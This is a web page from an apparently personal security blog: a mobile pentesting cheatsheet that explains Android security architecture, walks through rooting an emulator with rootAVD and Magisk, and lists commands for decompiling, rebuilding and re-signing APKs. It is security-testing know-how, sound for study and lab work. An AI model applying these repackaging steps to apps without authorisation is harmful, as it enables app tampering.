
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex" />

  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light)"
          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">


  <link rel="stylesheet"
        type="text/css"
        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />

  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">

        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 


      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>











 

<meta name="author" content="Jack69" />
<meta name="description" content="Android Concepts Architecture Kernel: it&#39;s a Linux Kernel. It&#39;s the most privileged as well as the hardest to reach. Some of the classic Linux kernel exploits are still applicable. It uses as well SELinux. It&#39;s responsible of the basic systems services: Memory Management Process Management Network Stack Devices Drivers Hardware …" />
<meta name="keywords" content="">


  <meta property="og:site_name" content="Jack's Corner"/>
  <meta property="og:title" content="Mobile Cheatsheet"/>
  <meta property="og:description" content="Android Concepts Architecture Kernel: it&#39;s a Linux Kernel. It&#39;s the most privileged as well as the hardest to reach. Some of the classic Linux kernel exploits are still applicable. It uses as well SELinux. It&#39;s responsible of the basic systems services: Memory Management Process Management Network Stack Devices Drivers Hardware …"/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/mobile/cheatsheet.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="1957-01-01 00:00:00+01:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
  <meta property="article:section" content="Cheatsheet"/>
  <meta property="og:image" content="">

  <title>Jack's Corner &ndash; Mobile Cheatsheet</title>


</head>
<body >

<aside>
  <div>
    <a href="https://ojack69.github.io/jacks-corner/">
      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
    </a>

    <h1>
      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
    </h1>


    <div class="stork">
        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
      <div class="stork-output" data-stork="sitesearch-output"></div>
    </div>


    <ul class="social">
      <li>
        <a class="sc-htb"
           href="https://app.hackthebox.com/profile/177323"
           target="_blank">
          <i class="fa-brands fa-htb"></i>
        </a>
      </li>
      <li>
        <a class="sc-thm"
           href="https://tryhackme.com/p/jack69"
           target="_blank">
          <i class="fa-brands fa-thm"></i>
        </a>
      </li>
    </ul>
  </div>
</aside>
  <main>

<nav>
  <a href="https://ojack69.github.io/jacks-corner/">Home</a>

  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>


</nav>

<article class="single">
  <header>
      
    <h1 id="mobile/cheatsheet">Mobile Cheatsheet</h1>
    <p>

    </p>
  </header>


  <div>
        <div class="toc col-lg-3 hidden-xs hidden-sm">
            <div id="toc"><ul><li><a class="toc-href" href="#android" title="Android">Android</a><ul><li><a class="toc-href" href="#concepts" title="Concepts">Concepts</a><ul><li><a class="toc-href" href="#architecture" title="Architecture">Architecture</a></li><li><a class="toc-href" href="#android-security" title="Android Security">Android Security</a></li><li><a class="toc-href" href="#system-security" title="System Security">System Security</a></li><li><a class="toc-href" href="#network-security" title="Network Security">Network Security</a></li><li><a class="toc-href" href="#software-isolation" title="Software Isolation">Software Isolation</a></li><li><a class="toc-href" href="#anti-exploitation" title="Anti-Exploitation">Anti-Exploitation</a></li><li><a class="toc-href" href="#components" title="Components">Components</a></li><li><a class="toc-href" href="#activity" title="Activity">Activity</a></li><li><a class="toc-href" href="#service" title="Service">Service</a></li><li><a class="toc-href" href="#broadcasts" title="Broadcasts">Broadcasts</a></li><li><a class="toc-href" href="#content-provider" title="Content Provider">Content Provider</a></li><li><a class="toc-href" href="#inter-process-communication-ipc" title="Inter-Process Communication (IPC)">Inter-Process Communication (IPC)</a></li><li><a class="toc-href" href="#intent" title="Intent">Intent</a></li><li><a class="toc-href" href="#binder" title="Binder">Binder</a></li></ul></li><li><a class="toc-href" href="#lab-setup_1" title="Lab Setup">Lab Setup</a><ul><li><a class="toc-href" href="#emulator-rooting-avd" title="Emulator Rooting (AVD)">Emulator Rooting (AVD)</a></li></ul></li><li><a class="toc-href" href="#patch-apk-with-frida-gadget_1" title="Patch APK with frida gadget">Patch APK with frida gadget</a></li><li><a class="toc-href" href="#static-analysis" title="Static Analysis">Static Analysis</a><ul><li><a class="toc-href" href="#manifest" title="Manifest">Manifest</a><ul><li><a class="toc-href" href="#main-activity" title="Main Activity">Main Activity</a></li><li><a class="toc-href" href="#exported-components" title="Exported Components">Exported Components</a></li><li><a class="toc-href" href="#http-enabled" title="HTTP Enabled">HTTP Enabled</a></li><li><a class="toc-href" href="#intent-filters" title="Intent Filters">Intent Filters</a></li><li><a class="toc-href" href="#reference" title="Reference">Reference</a></li></ul></li><li><a class="toc-href" href="#bypass-provider-restrictions_1" title="Bypass Provider Restrictions">Bypass Provider Restrictions</a></li><li><a class="toc-href" href="#backup" title="Backup">Backup</a></li><li><a class="toc-href" href="#lfi-path-traversal" title="LFI &amp; Path Traversal">LFI &amp; Path Traversal</a></li><li><a class="toc-href" href="#secrets-extraction" title="Secrets Extraction">Secrets Extraction</a></li><li><a class="toc-href" href="#app-links" title="App Links">App Links</a></li><li><a class="toc-href" href="#webviews" title="WebViews">WebViews</a></li></ul></li><li><a class="toc-href" href="#dynamic-analysis_1" title="Dynamic Analysis">Dynamic Analysis</a><ul><li><a class="toc-href" href="#packages-info" title="Packages Info">Packages Info</a></li><li><a class="toc-href" href="#network-traffic-capture" title="Network Traffic Capture">Network Traffic Capture</a><ul><li><a class="toc-href" href="#burp-certificate-installation" title="Burp Certificate Installation">Burp Certificate Installation</a></li></ul></li><li><a class="toc-href" href="#activities-services-content-providers-broadcast-receivers_1" title="Activities, Services, Content Providers, Broadcast Receivers">Activities, Services, Content Providers, Broadcast Receivers</a></li><li><a class="toc-href" href="#logging" title="Logging">Logging</a></li><li><a class="toc-href" href="#xss" title="XSS">XSS</a></li><li><a class="toc-href" href="#dynamic-code-injection-native-library-hijacking" title="Dynamic Code Injection - Native Library Hijacking">Dynamic Code Injection - Native Library Hijacking</a></li></ul></li></ul></li><li><a class="toc-href" href="#ios_2" title="iOS">iOS</a><ul><li><a class="toc-href" href="#concepts_1" title="Concepts">Concepts</a><ul><li><a class="toc-href" href="#architecture_1" title="Architecture">Architecture</a></li><li><a class="toc-href" href="#operating-system" title="Operating System">Operating System</a></li><li><a class="toc-href" href="#security-components" title="Security Components">Security Components</a></li><li><a class="toc-href" href="#data-protection" title="Data Protection">Data Protection</a></li><li><a class="toc-href" href="#inter-process-communication-ipc_1" title="Inter-Process Communication - IPC">Inter-Process Communication - IPC</a></li><li><a class="toc-href" href="#plist-and-entitlements" title="Plist and Entitlements">Plist and Entitlements</a></li><li><a class="toc-href" href="#keychain" title="Keychain">Keychain</a></li><li><a class="toc-href" href="#app-extensions" title="App Extensions">App Extensions</a></li><li><a class="toc-href" href="#webviews_1" title="WebViews">WebViews</a></li><li><a class="toc-href" href="#ipa" title="IPA">IPA</a></li></ul></li><li><a class="toc-href" href="#lab-setup_3" title="Lab Setup">Lab Setup</a><ul><li><a class="toc-href" href="#ssh-through-usb" title="SSH through USB">SSH through USB</a></li><li><a class="toc-href" href="#iphone-sshfs" title="iPhone SSHFS">iPhone SSHFS</a></li><li><a class="toc-href" href="#install-ipaapp-on-non-jailbreaken-device" title="Install IPA/APP on non-Jailbreaken device">Install IPA/APP on non-Jailbreaken device</a></li><li><a class="toc-href" href="#install-ipaapp-on-simulator" title="Install IPA/APP on simulator">Install IPA/APP on simulator</a></li><li><a class="toc-href" href="#extract-and-decrypt-ipa" title="Extract and Decrypt IPA">Extract and Decrypt IPA</a></li><li><a class="toc-href" href="#patch-ipa-with-frida-gadget" title="Patch IPA with frida gadget">Patch IPA with frida gadget</a></li><li><a class="toc-href" href="#patch-ipa-with-frida-gadget-objection" title="Patch IPA with frida gadget - Objection">Patch IPA with frida gadget - Objection</a></li><li><a class="toc-href" href="#patch-ipa-with-frida-gadget-manual" title="Patch IPA with frida gadget - Manual">Patch IPA with frida gadget - Manual</a></li><li><a class="toc-href" href="#jailbreaking" title="Jailbreaking">Jailbreaking</a></li><li><a class="toc-href" href="#proxy-configuration" title="Proxy Configuration">Proxy Configuration</a><ul><li><a class="toc-href" href="#ssl-certificate-installation" title="SSL Certificate Installation">SSL Certificate Installation</a></li><li><a class="toc-href" href="#simulator-proxy" title="Simulator Proxy">Simulator Proxy</a></li></ul></li></ul></li><li><a class="toc-href" href="#static-analysis_3" title="Static Analysis">Static Analysis</a><ul><li><a class="toc-href" href="#objective-c-analysis" title="Objective-C Analysis">Objective-C Analysis</a></li><li><a class="toc-href" href="#swift-analysis" title="Swift Analysis">Swift Analysis</a></li><li><a class="toc-href" href="#nuclei" title="Nuclei">Nuclei</a></li><li><a class="toc-href" href="#forensics" title="Forensics">Forensics</a></li></ul></li><li><a class="toc-href" href="#dynamic-analysis_3" title="Dynamic Analysis">Dynamic Analysis</a><ul><li><a class="toc-href" href="#jailbreak-detection-bypass" title="Jailbreak Detection Bypass">Jailbreak Detection Bypass</a></li><li><a class="toc-href" href="#ssl-pinning-bypass" title="SSL Pinning Bypass">SSL Pinning Bypass</a></li><li><a class="toc-href" href="#touchid-bypass" title="TouchID Bypass">TouchID Bypass</a></li><li><a class="toc-href" href="#uipasteboard" title="UIPasteboard">UIPasteboard</a></li><li><a class="toc-href" href="#local-data-storage" title="Local Data Storage">Local Data Storage</a><ul><li><a class="toc-href" href="#userdefaults" title="UserDefaults">UserDefaults</a></li><li><a class="toc-href" href="#shared-credentials-storage" title="Shared Credentials Storage">Shared Credentials Storage</a></li><li><a class="toc-href" href="#keychain_1" title="Keychain">Keychain</a></li><li><a class="toc-href" href="#coredata" title="CoreData">CoreData</a></li><li><a class="toc-href" href="#cache" title="Cache">Cache</a></li><li><a class="toc-href" href="#keyboard-cache" title="Keyboard Cache">Keyboard Cache</a></li><li><a class="toc-href" href="#yap-database" title="Yap Database">Yap Database</a></li><li><a class="toc-href" href="#background-screenshot" title="Background Screenshot">Background Screenshot</a></li></ul></li><li><a class="toc-href" href="#crypto_1" title="Crypto">Crypto</a></li><li><a class="toc-href" href="#inter-process-communication" title="Inter-Process-Communication">Inter-Process-Communication</a><ul><li><a class="toc-href" href="#universal-links-url-schemes" title="Universal Links &amp; URL Schemes">Universal Links &amp; URL Schemes</a></li><li><a class="toc-href" href="#app-extensions_2" title="App Extensions">App Extensions</a></li></ul></li></ul></li><li><a class="toc-href" href="#input-validation_2" title="Input Validation">Input Validation</a><ul><li><a class="toc-href" href="#memory-analysis" title="Memory Analysis">Memory Analysis</a></li><li><a class="toc-href" href="#network-traffic-analysis" title="Network Traffic Analysis">Network Traffic Analysis</a></li><li><a class="toc-href" href="#hooking" title="Hooking">Hooking</a></li></ul></li><li><a class="toc-href" href="#logging_2" title="Logging">Logging</a><ul><li><a class="toc-href" href="#logging-on-device" title="Logging on device">Logging on device</a></li><li><a class="toc-href" href="#logging-on-simulator" title="Logging on simulator">Logging on simulator</a></li></ul></li><li><a class="toc-href" href="#faq_1" title="FAQ">FAQ</a><ul><li><a class="toc-href" href="#1-ipa-crashes-without-logs-on-simulator" title="1. IPA crashes without logs on simulator">1. IPA crashes without logs on simulator</a></li><li><a class="toc-href" href="#2-objection" title="2. Objection">2. Objection</a></li></ul></li><li><a class="toc-href" href="#utils_1" title="Utils">Utils</a><ul><li><a class="toc-href" href="#ios-device" title="iOS Device">iOS Device</a></li><li><a class="toc-href" href="#macos" title="MacOS">MacOS</a></li></ul></li><li><a class="toc-href" href="#ios-todo_1" title="iOS - Todo">iOS - Todo</a></li></ul></li><li><a class="toc-href" href="#flutter_1" title="Flutter">Flutter</a><ul><li><a class="toc-href" href="#ssl-pinning-bypass_1" title="SSL Pinning Bypass">SSL Pinning Bypass</a></li><li><a class="toc-href" href="#http-traffic-interception_1" title="HTTP Traffic Interception">HTTP Traffic Interception</a></li></ul></li><li><a class="toc-href" href="#frida-objection_1" title="Frida &amp; Objection">Frida &amp; Objection</a><ul><li><a class="toc-href" href="#code-snippets" title="Code Snippets">Code Snippets</a></li></ul></li></ul></div>
        </div>
    <h2 id="android">Android</h2>
<h3 id="concepts">Concepts</h3>
<h4 id="architecture">Architecture</h4>
<p><img alt="android-framework.png" src="https://ojack69.github.io/jacks-corner/images/mobile/cheatsheet/android-framework.png"/></p>
<p><strong>Kernel</strong>: it's a Linux Kernel. It's the most privileged as well as the hardest to reach. Some of the classic Linux kernel exploits are still applicable.
It uses as well SELinux.</p>
<p>It's responsible of the basic systems services:</p>
<ul>
<li>Memory Management</li>
<li>Process Management</li>
<li>Network Stack</li>
<li>Devices Drivers</li>
</ul>
<p><strong>Hardware Abstraction Layer (HAL)</strong>: handles the communication between Native libraries and the hardware by mean of software hooks (or interfaces).</p>
<p>Each HAL module is separated from the other by the perspective of security:</p>
<p><img alt="android-hardware abstraction layer-security boundaries.png" src="https://ojack69.github.io/jacks-corner/images/mobile/cheatsheet/android-hardware abstraction layer-security boundaries.png"/></p>
<p><strong>Native Libraries &amp; Android Runtime</strong>: Many core Android system components and services, such as ART and HAL, are built from native code that requires native libraries written in C and C++. The Android platform provides Java framework APIs to expose the functionality of some of these native libraries to apps. </p>
<p>For devices running Android version 5.0 (API level 21) or higher, each app runs in its own process and with its own instance of the Android Runtime (ART), running multiple virtual machine, implementing some optimizations like:</p>
<ul>
<li>Ahead-of-time (AOT) &amp; Just-in-time (JIT) compilation: improve application performances and reduces memory usage.</li>
<li>Optimized garbage collection (GC)</li>
</ul>
<p>Prior to Android version 5.0 (API level 21), Dalvik was the Android runtime. If your app runs well on ART, then it can work on Dalvik as well, but the reverse might not be true. </p>
<p>The Java code is first compiled to Java bytecode (.class) by the Java compiler and then compiled to Dalvik bytecode (.dex) by the Dalvik compiler.</p>
<p><strong>Java API Framework</strong>: provides high-level APIs for developers enabling them to create and manage the user interface, handle user input, and access device features.</p>
<h4 id="android-security">Android Security</h4>
<h4 id="system-security">System Security</h4>
<p>Reference: <a href="https://source.android.com/docs/security">https://source.android.com/docs/security</a></p>
<p><strong>Device encryption</strong></p>
<ul>
<li>File-based (Android 7+) - <a href="https://source.android.com/docs/security/features/encryption/file-based">Reference</a>: Allows different file to be encrypted with different independent keys.</li>
<li>Full-disk (Android 5+) - <a href="https://source.android.com/docs/security/features/encryption/full-disk">Reference</a>: uses a single key protected with the user device password, to encrypt a whole userdata partition.</li>
<li>Metadata Encryption (Android 9+) - <a href="https://source.android.com/docs/security/features/encryption/metadata">Reference</a></li>
</ul>
<p><strong>Tusted Execution Environment (TEE)</strong> - <a href="https://source.android.com/docs/security/features/trusty">Reference</a>: it's a secure isolated area in running on the same processor as the Android OS, designed to safely provide and protect sensitive code and data processed in the execution environment.</p>
<ul>
<li><strong>Hardware</strong>: Keystore to store for example cryptographic keys and biometrics</li>
<li><strong>Software</strong>: Trusted applications and API&rsquo;s</li>
</ul>
<p><img alt="android-trusted-vs-risk-execution-environment.png" src="https://ojack69.github.io/jacks-corner/images/mobile/cheatsheet/android-trusted-vs-risk-execution-environment.png"/></p>
<p><strong>REE</strong> stands for <strong>Risk Execution Environment</strong>.</p>
<p><strong>Verified boot</strong>: strives to ensure all executed code comes from a trusted source.</p>
<h4 id="network-security">Network Security</h4>
<p>TLS is used by default and, since Android 9, DNS over TLS is supported.
Android allows separate network security config per app.</p>
<p>Certificate pinning is used to prevent encrpyted traffic sniffing by defining an harcoded set of trusted Certification Authorities. </p>
<h4 id="software-isolation">Software Isolation</h4>
<p>Permissions are declared per app in their manifest file.</p>
<p>Android uses Security-Enhanced Linux (SELinux) to enforce mandatory access control (MAC) over all processes, even processes running with root/superuser privileges (Linux capabilities). <a href="https://source.android.com/docs/security/features/selinux">Reference</a>
With SELinux, Android can better protect and confine system services, control access to application data and system logs, reduce the effects of malicious software, and protect users from potential flaws in code on mobile devices, isolating apps in sandboxes.</p>
<p>SELinux operates on the principle of default denial: Anything not explicitly allowed is denied. SELinux can operate in two global modes:</p>
<ul>
<li><em>Permissive</em> mode, in which permission denials are logged but not enforced.</li>
<li><em>Enforcing</em> mode, in which permissions denials are both logged <strong>and</strong> enforced.</li>
</ul>
<h4 id="anti-exploitation">Anti-Exploitation</h4>
<p>Android has different protections against (kernel) exploits / buffer overflows:</p>
<ul>
<li><strong>ASLR</strong>: Address Space Layout Randomization, since Android 4.1</li>
<li><strong>KASLR</strong>: enables address space randomization for the Linux kernel image by randomizing where the kernel code is placed at boot time. Since Android 8</li>
<li><strong>DEP</strong>: Data Execution Prevention (DEP)</li>
<li><strong>SECCOMP</strong> filter, to secure syscalls</li>
</ul>
<h4 id="components">Components</h4>
<h4 id="activity">Activity</h4>
<p>An activity is the entry point for user interaction. It represents a single screen with a user interface.</p>
<h4 id="service">Service</h4>
<p>A Service is an application component that can perform long-running operations in the background. It does not provide a user interface. Once started, a service might continue running for some time, even after the user switches to another application. </p>
<p>It's different from a thread!</p>
<p>Note: A service runs in the main thread of its hosting process; the service does&nbsp;<strong>not</strong>&nbsp;create its own thread and does&nbsp;<strong>not</strong>&nbsp;run in a separate process unless you specify otherwise.</p>
<p>These are the three different types of services:</p>
<ul>
<li><strong>Foreground</strong>: A foreground service performs some operation that is noticeable to the user, displaying a notification.</li>
<li><strong>Background</strong>: A foreground service performs some operation that is noticeable to the user.</li>
<li><strong>Bound</strong>:  A bound service offers a client-server interface that allows components to interact with the service, send requests, receive results, and even do so across processes with interprocess communication (IPC). It runs only as long as another component is bound to it. The bounding is done by calling <code>bindService()</code>.</li>
</ul>
<h4 id="broadcasts">Broadcasts</h4>
<p>Broadcasts implement the publish-subscribe pattern, allowing apps to send or receive broadcast messages from the system or other apps. These broadcasts are sent when an event of interest occurs.</p>
<p>The system optimizes the delivery of broadcasts in order to maintain optimal system health.</p>
<p>Apps can register to receive specific broadcasts. When a broadcast is sent, the system automatically routes broadcasts to apps that have subscribed to receive that particular type of broadcast.</p>
<p>Each broadcast is delivered as an <strong>Intent</strong>.</p>
<h4 id="content-provider">Content Provider</h4>
<p>Content providers can help an application manage access to data stored by itself or stored by other apps and provide a way to share data with other apps. They encapsulate the data and provide mechanisms for defining data security. Content providers are the standard interface that connects data in one process with code running in another process.</p>
<p>The encapsulated data is made accessible by an URI.</p>
<h4 id="inter-process-communication-ipc">Inter-Process Communication (IPC)</h4>
<p>Android IPC provides a secure way to tranfer data between apps / sandboxes by mean of:</p>
<ul>
<li>Middleware using Binder framework</li>
<li>Intents</li>
</ul>
<h4 id="intent">Intent</h4>
<p>An Intent is a messaging object you can use to request an action from another app component.
Activities, services, and broadcast receivers are activated by intents.</p>
<p>There are two types of intents:</p>
<ul>
<li><strong>Explicit</strong>: specify which component of which application will satisfy the intent, by specifying a full ComponentName</li>
<li><strong>Implicit</strong>: do not name a specific component, but instead declare a general action to perform, which allows a component from another app to handle it.</li>
</ul>
<p>When you use an implicit intent, the Android system finds the appropriate component to start by comparing the contents of the intent to the <strong>intent filters</strong> declared in the manifest file of other apps on the device.</p>
<h4 id="binder">Binder</h4>
<p>https://medium.com/@ashu.knock/binders-in-android-part-1-e875daeb762f</p>
<p>Processes in Android have separate address spaces and a process cannot directly access another process&rsquo;s memory (process isolation).
If a process wants to offer some useful service(s) to other processes, it needs to provide some mechanism that allows other processes to discover and interact with those services. That mechanism is referred to as <em>IPC</em>.</p>
<p>Binder is an IPC mechanism developed for Android that abstracts the low-level details of IPC from the developer, allowing applications to easily talk to both the System Server and others&rsquo; remote service components.</p>
<p>The Binder kernel driver manages part of the address space of each process, allowing inter-process comunication.</p>
<h3 id="lab-setup_1">Lab Setup</h3>
<h4 id="emulator-rooting-avd">Emulator Rooting (AVD)</h4>
<p>Reference: <a href="https://8ksec.io/rooting-an-android-emulator-for-mobile-security-testing/">https://8ksec.io/rooting-an-android-emulator-for-mobile-security-testing/</a></p>
<p>1 - Prerequisites: Ensure that <code>platform-tools</code> and <code>emulator</code> folders in the Android SDK installation are included in the <code>$PATH</code>. This is needed in order to invoke the binaries <code>adb</code> and <code>emulator</code>.</p>
<p>2 - Create a new device using Android Studio's Device Manager.</p>
<p>3 - Disable Snapshots for a <strong>Cold Boot</strong>. </p>
<p>4 - Cold Boot the device from the Android Studio's Device Manger or from command line with the following command:</p>
<div class="highlight"><pre><span></span><code>emulator<span class="w"> </span>-avd<span class="w"> </span>&lt;device<span class="w"> </span>name&gt;<span class="w"> </span>-no-snapshot-load
</code></pre></div>
<p>5 - Download the latest <code>rootAVD</code> script:</p>
<div class="highlight"><pre><span></span><code>git<span class="w"> </span>clone<span class="w"> </span>https://gitlab.com/newbit/rootAVD.git
</code></pre></div>
<p>6 - Run the following command to list all installed AVD system images:</p>
<div class="highlight"><pre><span></span><code>./rootAVD.sh<span class="w"> </span>ListAllAVDs
</code></pre></div>
<p>7 - Launch the rooting process with the following command:</p>
<div class="highlight"><pre><span></span><code>./rootAVD.sh<span class="w"> </span>&lt;<span class="s2">"ramdisk.img"</span><span class="w"> </span>image<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>previous<span class="w"> </span><span class="nb">command</span><span class="w"> </span>output<span class="w"> </span>depending<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>taget<span class="w"> </span>device<span class="w"> </span>API<span class="w"> </span>level&gt;
</code></pre></div>
<p>8 - Follow the wizard. Generally the default options works fine.</p>
<p>8.1 - For some recent Android versions (like API 34), the standard patch might report <code>&ldquo;Magisk Installed: N/A&rdquo;</code> or fail to inject properly If the script output indicates Magisk wasn&rsquo;t installed, you should rerun the command with the <code>FAKEBOOTIMG</code> option:</p>
<div class="highlight"><pre><span></span><code>./rootAVD.sh<span class="w"> </span>&lt;<span class="s2">"ramdisk.img"</span><span class="w"> </span>image<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>previous<span class="w"> </span><span class="nb">command</span><span class="w"> </span>output<span class="w"> </span>depending<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>taget<span class="w"> </span>device<span class="w"> </span>API<span class="w"> </span>level&gt;<span class="w"> </span>FAKEBOOTING
</code></pre></div>
<ul>
<li>The script will push a file (e.g.&nbsp;<code>fakeboot.img</code>) into the emulator&rsquo;s <code>/sdcard/Download</code> directory.</li>
<li>It will then display a message like <em>&ldquo;Install/Patch /sdcard/Download/fakeboot.img and hit Enter when done&rdquo;.</em> At this point, <strong>do not press Enter yet.</strong> Instead, go to the emulator, launch the <strong>Magisk app</strong>, and use the <strong>Install -&gt; Select and Patch a File</strong> option. Navigate to <code>/sdcard/Download/</code> and select <code>fakeboot.img</code>. Magisk will patch the image and output a modified file. Usually it says &ldquo;Output file is &hellip;&rdquo;. Once Magisk finishes, return to the terminal and press Enter to let rootAVD continue.</li>
<li>The script will then finish the installation, replace the AVD&rsquo;s ramdisk with the patched version, and automatically reboot the emulator to apply changes. You should see a success message indicating Magisk is installed.</li>
</ul>
<p>9 - Reboot the device (cold boot).</p>
<p>10 - Open the Magisk application and perform all the updates.</p>
<p>11 - Toggle superuser capabilities in the Magisk application.</p>
<p>Useful Magisk plugins:</p>
<ul>
<li>Burp Certificate Pinning: <a href="https://github.com/pwnlogs/cert-fixer">https://github.com/pwnlogs/cert-fixer</a></li>
<li>Frida Server: <a href="https://github.com/ViRb3/magisk-frida">https://github.com/ViRb3/magisk-frida</a></li>
</ul>
<h3 id="patch-apk-with-frida-gadget_1">Patch APK with frida gadget</h3>
<p>Reference: <a href="https://koz.io/using-frida-on-android-without-root/">https://koz.io/using-frida-on-android-without-root/</a></p>
<h3 id="static-analysis">Static Analysis</h3>
<ul>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a></li>
<li><a href="https://github.com/mindedsecurity/semgrep-rules-android-security">Semgrep Android Rules</a></li>
<li><a href="https://github.com/charles2gan/GDA-android-reversing-Tool">GDA - Android Reversing Tool</a></li>
</ul>
<p>Reverse Engineer APK:</p>
<div class="highlight"><pre><span></span><code>jadx<span class="w"> </span>-d<span class="w"> </span>&lt;absolute<span class="w"> </span>output<span class="w"> </span>path&gt;<span class="w"> </span>&lt;absolute<span class="w"> </span>target<span class="w"> </span>apk&gt;

jadx<span class="w"> </span>-d<span class="w"> </span>&lt;absolute<span class="w"> </span>output<span class="w"> </span>path&gt;<span class="w"> </span>&lt;absolute<span class="w"> </span>target<span class="w"> </span>apk&gt;<span class="w"> </span>--deobf<span class="w"> </span>//<span class="w"> </span>Try<span class="w"> </span>de-obfuscate

apktool<span class="w"> </span>d<span class="w"> </span>&lt;apk&gt;<span class="w"> </span>//<span class="w"> </span>Get<span class="w"> </span>Dalvik<span class="w"> </span>Bytecode

apktool<span class="w"> </span>b<span class="w"> </span>&lt;decompiled<span class="w"> </span>directory&gt;<span class="w"> </span>-o<span class="w"> </span>&lt;output<span class="w"> </span>apk&gt;<span class="w"> </span>//<span class="w"> </span>Re-build<span class="w"> </span>Dalvik<span class="w"> </span>Bytecode
</code></pre></div>
<p>Sign an APK:</p>
<div class="highlight"><pre><span></span><code>//<span class="w"> </span>Generate<span class="w"> </span>a<span class="w"> </span>new<span class="w"> </span>key<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>specified<span class="w"> </span>keystore<span class="w"> </span>

keytool<span class="w"> </span>-genkey<span class="w"> </span>-v<span class="w"> </span>-keystore<span class="w"> </span>my-release-key.keystore<span class="w"> </span>-alias<span class="w"> </span>alias_name<span class="w"> </span>-keyalg<span class="w"> </span>RSA<span class="w"> </span>-keysize<span class="w"> </span><span class="m">2048</span><span class="w"> </span>-validity<span class="w"> </span><span class="m">10000</span>

//<span class="w"> </span>Sign<span class="w"> </span>the<span class="w"> </span>apk<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>keystore<span class="w"> </span>containing<span class="w"> </span>the<span class="w"> </span>generated<span class="w"> </span>key

jarsigner<span class="w"> </span>-verbose<span class="w"> </span>-sigalg<span class="w"> </span>SHA1withRSA<span class="w"> </span>-digestalg<span class="w"> </span>SHA1<span class="w"> </span>-keystore<span class="w"> </span>my-release-key.keystore<span class="w"> </span>&lt;apk<span class="w"> </span>file&gt;<span class="w"> </span>&lt;alias&gt;
</code></pre></div>
<p>Dump APK useful information:</p>
<div class="highlight"><pre><span></span><code>aapt<span class="w"> </span>dump<span class="w"> </span>badging<span class="w"> </span>base.apk

aapt<span class="w"> </span>list<span class="w"> </span>-a<span class="w"> </span>base.apk
aapt<span class="w"> </span>list<span class="w"> </span>-a<span class="w"> </span>base.apk<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>minSdkVersion<span class="w"> </span><span class="c1"># Convert hex value to decimal with echo $((16#&lt;hex value&gt;))</span>
</code></pre></div>
<p>Smali References:</p>
<ul>
<li><a href="http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html">http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html</a></li>
<li><a href="https://github.com/JesusFreke/smali/wiki/Registers">https://github.com/JesusFreke/smali/wiki/Registers</a></li>
</ul>
<h4 id="manifest">Manifest</h4>
<h5 id="main-activity">Main Activity</h5>
<p>Locate Main Activity in manifest, it's declared like following snippet:</p>
